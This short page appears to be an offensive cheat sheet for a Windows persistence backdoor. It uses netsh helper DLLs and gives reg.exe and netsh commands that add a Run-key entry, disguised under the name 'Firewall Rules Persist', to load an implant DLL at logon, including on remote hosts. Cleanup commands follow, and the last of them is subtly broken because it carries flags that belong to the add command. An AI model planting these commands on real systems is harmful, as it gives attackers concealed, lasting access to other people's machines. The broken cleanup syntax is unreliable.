# Netsh

## Backdoor

```
C:\> reg.exe add "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Firewall Rules Persist" /t REG_SZ /d "C:\Windows\System32\netsh" /f

C:\> netsh.exe add helper C:\path\to\implant.dll
```

Interactive prompt.

```
C:\> netsh.exe

netsh> add helper C:\path\to\implant.dll
```

## CleanUp

To cleanup the backdoor just specify the path to DLL implant.

```
C:\> netsh.exe delete helper C:\path\to\implant.dll
```

This can be done with an interactive prompt.

```
C:\> netsh.exe

netsh> delete helper C:\path\to\implant.dll
```

Delete the registry entry.

```
C:\> reg.exe delete "HKLM\SOFTWARE\Microsoft\NetSh" /v implant /f

C:\> reg.exe delete "[\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Firewall Rules Persist" /t REG_SZ /d "C:\Windows\System32\netsh" /f
```

---
## References

- [Persistence Info: `netsh.exe` extensions ](https://persistence-info.github.io/Data/netsh.html)